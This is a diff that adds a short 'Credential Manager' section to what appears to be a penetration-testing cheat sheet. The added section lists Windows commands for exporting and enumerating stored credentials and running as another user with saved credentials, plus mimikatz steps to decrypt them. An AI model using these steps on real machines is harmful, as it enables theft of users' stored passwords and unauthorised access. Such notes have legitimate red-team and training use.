@@ -220,4 +220,64 @@
 
 <br>
 
-#
+### Credential Manager
+```
+# Documentation on this feature is limited to the public. 
+# It stores creds in special encrypted folders under the system and user profiles 
+
+# Export cred manager 
+    1. rundll32 keymgr.dll,KRShowKeyMgr
+
+# Enumerate Creds 
+    1. cmdkey /list
+
+# Run as another user (Target: Domain:interactive=*)
+    1.  runas /savecred /user:...
+
+# Run mimikatz to decrypt stored creds
+    1. mimikatz.exe 
+    2. privledge::debug
+    3. sekurlsa::credman
+
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+End 
